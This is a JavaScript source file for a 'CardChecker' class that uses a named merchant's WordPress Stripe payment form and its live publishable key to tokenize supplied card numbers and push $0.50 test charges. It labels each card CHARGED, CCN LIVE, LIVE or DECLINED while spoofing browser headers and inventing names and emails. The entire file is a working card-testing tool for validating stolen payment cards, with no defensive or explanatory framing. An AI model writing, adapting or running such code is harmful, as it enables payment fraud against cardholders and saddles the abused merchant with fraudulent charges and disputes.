const axios = require('axios');

class CardChecker {
    constructor() {
        this.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.hwstjohn.com',
            'Referer': 'https://www.hwstjohn.com/pay-now/'
        };
    }

    async createStripeToken(cardData) {
        try {
            const sessionResponse = await axios.post('https://m.stripe.com/6', {}, {
                headers: { 'User-Agent': this.headers['User-Agent'] }
            });
            const { muid, guid, sid } = sessionResponse.data;

            const tokenData = new URLSearchParams({
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': 'pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq',
                'card[number]': cardData.cc,
                'card[exp_month]': cardData.month,
                'card[exp_year]': cardData.year,
                'card[cvc]': cardData.cvv,
                'card[name]': cardData.name || `Check ${Date.now()}`
            });

            const tokenResponse = await axios.post(
                'https://api.stripe.com/v1/tokens',
                tokenData.toString(),
                {
                    headers: {
                        ...this.headers,
                        'Authorization': 'Bearer pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq'
                    }
                }
            );
            return tokenResponse.data.id;
        } catch (error) {
            const errorMsg = error.response?.data?.error?.message;
            if (errorMsg?.includes('security code')) {
                return { status: 'CCN', message: errorMsg };
            }
            throw new Error(errorMsg || 'Error creating Stripe token');
        }
    }

    async getFormNonce() {
        try {
            const response = await axios.get('https://www.hwstjohn.com/pay-now/');
            const match = response.data.match(/name="formNonce"\s+value="([^"]+)"/);
            return match ? match[1] : null;
        } catch (error) {
            throw new Error('Error getting form nonce');
        }
    }

    async processPayment(cardData, nonce, stripeToken) {
        try {
            const formData = new URLSearchParams({
                'action': 'wp_full_stripe_payment_charge',
                'formName': 'default',
                'formNonce': nonce,
                'fullstripe_name': cardData.name || `Check ${Date.now()}`,
                'fullstripe_email': cardData.email || `check${Date.now()}@gmail.com`,
                'fullstripe_custom_amount': '0.50',
                'fullstripe_amount_index': '0',
                'stripeToken': stripeToken
            });

            const response = await axios.post(
                'https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                formData.toString(),
                { headers: this.headers }
            );
            return this.parseResponse(response.data);
        } catch (error) {
            throw error;
        }
    }

    parseResponse(response) {
        const result = {
            success: false,
            status: 'DECLINED',
            message: response.msg || 'Unknown error',
            time: '0.0',
            icon: '❌'
        };
        if (response.success) {
            result.success = true;
            result.status = 'CHARGED $0.50';
            result.icon = '✅';
        } else if (response.msg?.includes('security code')) {
            result.success = true;
            result.status = 'CCN LIVE';
            result.icon = '⚠️';
        } else if (response.msg?.includes('insufficient funds')) {
            result.success = true;
            result.status = 'LIVE';
            result.icon = '✅';
        }
        return result;
    }

    async check(cardData) {
        const startTime = Date.now();
        try {
            const nonce = await this.getFormNonce();
            const tokenResult = await this.createStripeToken(cardData);
            if (tokenResult.status === 'CCN') {
                return {
                    success: true,
                    status: 'CCN LIVE',
                    message: tokenResult.message,
                    time: ((Date.now() - startTime) / 1000).toFixed(1),
                    icon: '⚠️'
                };
            }
            const result = await this.processPayment(cardData, nonce, tokenResult);
            result.time = ((Date.now() - startTime) / 1000).toFixed(1);
            return result;
        } catch (error) {
            return {
                success: false,
                status: 'DECLINED',
                message: error.message,
                time: ((Date.now() - startTime) / 1000).toFixed(1),
                icon: '❌'
            };
        }
    }
}

module.exports = CardChecker;